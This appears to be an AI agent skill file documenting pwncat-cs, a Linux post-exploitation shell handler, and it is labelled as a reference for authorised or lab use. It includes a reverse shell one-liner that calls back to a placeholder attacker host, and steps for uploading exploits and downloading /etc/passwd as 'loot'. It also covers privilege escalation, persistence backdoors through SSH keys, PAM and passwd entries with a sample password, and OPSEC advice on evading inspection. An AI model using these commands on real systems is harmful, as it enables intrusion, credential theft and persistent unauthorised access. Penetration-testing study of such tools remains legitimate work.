---
name: pwncat
description: "Auth/lab ref: pwncat-cs Linux session management; listener/connect modes, shell stabilization, module enum, tunnel and cleanup workflow."
license: MIT
compatibility: "Target: primarily Linux (Windows support exists but this skill is Linux-focused)."
metadata:
  author: AeonDave
  version: "1.0"
---

# pwncat

`pwncat-cs` is a shell handler + post-exploitation framework. It wraps unstable shells, exposes module-based automation (`search` / `use` / `run`), and manages persistence implants with reconnect support.

## Quick Start

```bash
# Start listener for reverse shell
pwncat-cs -lp 4444

# Target callback example
bash -i >& /dev/tcp/ATTACKER/4444 0>&1

# SSH channel (stable and preferred when creds exist)
pwncat-cs user@10.10.10.10

# Bind shell connect
pwncat-cs connect://10.10.10.10:4444
```

## Core Concepts

- **Local mode**: pwncat commands (`search`, `use`, `run`, `upload`, `download`, `escalate`)
- **Remote mode**: target shell commands (`id`, `uname -a`, `cat /etc/passwd`)
- Toggle modes with `Ctrl-D`.

## Essential Commands

| Command | Description |
|---|---|
| `search <glob>` | Find modules (ex: `search enumerate.*`) |
| `use <module>` | Enter module context |
| `info` | Show selected module arguments/help |
| `set <arg> <value>` | Set module argument in context |
| `run <module> [k=v...]` | Execute module directly |
| `escalate list [-u user]` | List available escalation paths |
| `escalate run [-u user]` | Execute escalation (direct + recursive chaining) |
| `run implant ...` | List/escalate/remove installed implants |
| `upload <local> <remote>` | Upload file to target |
| `download <remote> <local>` | Download file from target |
| `back` | Leave module context |
| `exit` | Exit pwncat |

## Module Workflow (Recommended)

Use the module workflow instead of ad-hoc commands:

```text
(local) pwncat$ search enumerate.*
(local) pwncat$ use enumerate.gather
(enumerate.gather) local$ info
(enumerate.gather) local$ set types file.suid
(enumerate.gather) local$ run
```

Equivalent one-liner:

```text
(local) pwncat$ run enumerate.gather types=file.suid
```

## Upload & Execution Workflow

```text
# Upload local file to target
(local) pwncat$ upload /opt/tools/exploit.sh /tmp/exploit.sh

# Execute on target (remote mode command)
(remote) target$ chmod +x /tmp/exploit.sh
(remote) target$ /tmp/exploit.sh

# Download loot
(local) pwncat$ download /etc/passwd ./loot/passwd.target
```

## Privilege Escalation Workflow

```text
# Enumerate escalation options
(local) pwncat$ escalate list
(local) pwncat$ escalate list -u root

# Execute escalation
(local) pwncat$ escalate run
(local) pwncat$ escalate run -u root
```

Notes:
- `escalate run` tries direct paths first, then recursive chains if needed.
- Validate after escalation (`id`, `whoami`, access checks).

## Persistence Implants Workflow

`pwncat` has first-class implant modules for install/list/escalate/remove.

```text
# install key implant (preferred)
(local) pwncat$ run implant.authorized_key key=./id_rsa.pub

# install as specific user (requires required privileges)
(local) pwncat$ run implant.authorized_key user=john key=./id_rsa.pub

# optional high-noise / higher-risk implants
(local) pwncat$ run implant.pam password='TempBackdoor!'
(local) pwncat$ run implant.passwd backdoor_user=svc-backup backdoor_pass='TempBackdoor!'

# list implants
(local) pwncat$ run implant
(local) pwncat$ run implant list

# escalate via local implant
(local) pwncat$ run implant escalate

# remove implants at end of operation
(local) pwncat$ run implant remove
```

## Reconnect Workflow

If implants were installed, reconnecting is built-in:

```bash
# List known implant-enabled hosts
pwncat-cs --list

# Reconnect by host-id (best when NAT/shared IP)
pwncat-cs <host-id>

# Reconnect by user@host (tries known implants then ssh fallback)
pwncat-cs user@10.10.10.10
```

## Connection Modes (CLI)

```bash
# catch raw reverse shell
pwncat-cs -lp 4444

# connect to bind shell
pwncat-cs connect://10.10.10.10:4444

# ssh channel
pwncat-cs ssh://user:password@10.10.10.10
pwncat-cs -i ./id_rsa user@10.10.10.10

# encrypted listener (auto self-signed cert)
pwncat-cs --ssl -lp 4444

# windows platform example (out of scope for this skill)
pwncat-cs -m windows -lp 4444
```

## OPSEC Guidance

- Prefer explicit protocol URIs (`bind://`, `connect://`, `ssh://`) in scripts.
- Prefer `implant.authorized_key` over password implants when feasible.
- Use encrypted channels (`--ssl`) when traffic inspection risk is high.
- Remove implants when engagement phase ends (`run implant remove`).
- Avoid assuming module names; discover with `search` first.

## Integration with Other Skills

| Skill | Why combine |
|---|---|
| `linpeas` | Deep Linux enumeration outside pwncat modules |
| `linux-persistence` | Persistence tradeoffs and hardening-aware patterns |
| `ssh-key-scanner` | Key discovery and lateral movement planning |

## Known Pitfalls

- Confusing `pwncat` vs `pwncat-cs` binary names.
- Relying on implicit protocol parsing in automation.
- Treating ad-hoc shell commands as module execution.
- Installing implants and forgetting removal/verification.

## Resources

| File | When to load |
|---|---|
| `references/module-workflow-cheatsheet.md` | When you need exact `search/use/set/run` and `escalate` usage patterns |
| `references/connection-modes-and-opsec.md` | When selecting bind/connect/ssh/ssl mode and planning low-noise access |
| `references/post-exploitation-playbook.md` | For end-to-end Linux flow: access → enum → escalate → persist → reconnect → cleanup |

